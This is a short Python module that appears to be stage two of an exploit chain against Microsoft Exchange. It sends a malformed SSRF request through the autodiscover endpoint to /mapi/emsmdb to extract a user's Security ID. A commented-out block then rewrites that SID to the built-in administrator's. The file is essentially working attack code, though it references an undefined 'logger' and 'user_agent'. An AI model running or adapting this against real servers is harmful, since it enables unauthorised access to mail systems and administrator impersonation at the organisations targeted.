import requests
import log

def GetSID(target, legacyDn):
    logger.debug(
        "[Stage 2] Performing malformed SSRF attack to obtain Security ID (SID) using endpoint /mapi/emsmdb against " + target)

    # Malformed MAPI body
    mapi_body = legacyDn + "\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"

    # Send the request
    stage2 = requests.post(
        f"https://{target}/autodiscover/autodiscover.json?a=fun@fuk.fuk/mapi/emsmdb/?=&Email=autodiscover/autodiscover.json?a=fun@fuk.fuk",
        headers={
            "Content-Type": "application/mapi-http",
            "User-Agent": user_agent,
            "X-RequestId": "1337",
            "X-ClientApplication": "Outlook/15.00.0000.0000",
            # The headers X-RequestId, X-ClientApplication and X-requesttype are required for the request to work
            "x-requesttype": "connect"},
        data=mapi_body,
        verify=False
    )

    if stage2.status_code != 200 or "act as owner of a UserMailbox" not in stage2.content.decode('cp1252').strip():
        logger.error("[Stage 2] Mapi Error! ResponseCode:{}".format(stage2.status_code))

    sid = stage2.content.decode('cp1252').strip().split("with SID ")[1].split(" and MasterAccountSid")[0]

    ##if sid.split("-")[-1] != "500":
    # logger.warning("[Stage 2] User SID not an administrator, fixing user SID")
    # base_sid = sid.split("-")[:-1]
    # base_sid.append("500")
    # sid = "-".join(base_sid)

    logger.debug("[Stage 2] Successfully obtained SID: " + sid)
    return sid
